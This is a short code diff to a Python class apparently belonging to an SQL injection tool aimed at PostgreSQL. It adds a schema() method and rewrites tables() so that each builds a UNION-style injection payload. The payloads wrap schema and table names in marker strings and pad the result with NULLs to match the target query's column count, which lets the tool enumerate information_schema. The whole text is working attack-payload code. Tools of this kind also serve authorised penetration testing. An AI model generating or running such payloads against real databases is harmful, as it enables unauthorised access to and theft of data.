@@ -11,8 +11,11 @@ class SQLInjectionEnginePostgreSQL(SQLInjectionEngine):
     def version(self):
         return f"SELECT CONCAT('{SQLInjectionEngine.injection_prefix}', 'version:',version(), '{SQLInjectionEngine.injection_suffix}')"
 
-    def tables(self) -> str:
-        return "SELECT table_name FROM information_schema.tables"
+    def schema(self, columns) -> str:
+        return f"SELECT CONCAT('{SQLInjectionEngine.injection_prefix}', 'schema:', schema_name, '{SQLInjectionEngine.injection_suffix}'){', NULL' * (columns - 2)} FROM information_schema.schemata"
+
+    def tables(self, columns) -> str:
+        return f"SELECT CONCAT('{SQLInjectionEngine.injection_prefix}', 'table:', table_name, '{SQLInjectionEngine.injection_suffix}'){', NULL' * (columns - 2)} FROM information_schema.tables"
 
     def column_names(self, table_name):
         if table_name is None:
